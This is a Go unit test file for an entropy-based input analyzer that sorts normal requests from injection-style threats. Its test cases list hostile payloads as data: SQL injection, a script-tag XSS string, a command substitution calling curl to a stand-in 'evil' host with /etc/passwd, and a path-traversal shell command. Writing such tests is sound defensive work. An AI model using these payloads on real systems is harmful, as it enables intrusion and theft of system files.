package entropy

import "testing"

func TestAnalyzeTreatsBusinessInputAsLowEntropy(t *testing.T) {
	result := Analyze("GET /api/users?id=123 HTTP/1.1")
	if result.Value >= 0.7 {
		t.Fatalf("expected low entropy score, got %.4f", result.Value)
	}
	if result.Threat {
		t.Fatalf("expected business input to be non-threat: %+v", result)
	}
}

func TestAnalyzeFlagsInjectionStylePayloads(t *testing.T) {
	cases := []string{
		"' OR '1'='1' --",
		"<script>alert(1)</script>",
		"$(curl http://evil)/etc/passwd",
		"../../../../bin/sh -c id",
	}

	for _, payload := range cases {
		result := Analyze(payload)
		if result.Value <= 0.35 {
			t.Fatalf("expected high-ish entropy score for %q, got %.4f", payload, result.Value)
		}
		if !result.Threat {
			t.Fatalf("expected threat for %q, got %+v", payload, result)
		}
	}
}

func TestAnalyzeHandlesEmptyInput(t *testing.T) {
	result := Analyze("")
	if result.Value != 0 {
		t.Fatalf("expected zero score, got %.4f", result.Value)
	}
	if result.Threat {
		t.Fatalf("expected empty input to be safe: %+v", result)
	}
}

func TestAnalyzeWithThresholdOverridesDefault(t *testing.T) {
	result := AnalyzeWithThreshold("id=1&role=admin", 0.1)
	if !result.Threat {
		t.Fatalf("expected custom threshold to mark threat: %+v", result)
	}
	if result.Threshold != 0.1 {
		t.Fatalf("expected threshold to be preserved, got %.4f", result.Threshold)
	}
}

func TestAnalyzeValueBounds(t *testing.T) {
	result := AnalyzeWithThreshold("a very long and weird string with symbols !!! {{{((()))}}}%%%", DefaultThreatThreshold)
	if result.Value < 0 || result.Value > 1 {
		t.Fatalf("expected score within bounds, got %.4f", result.Value)
	}
}
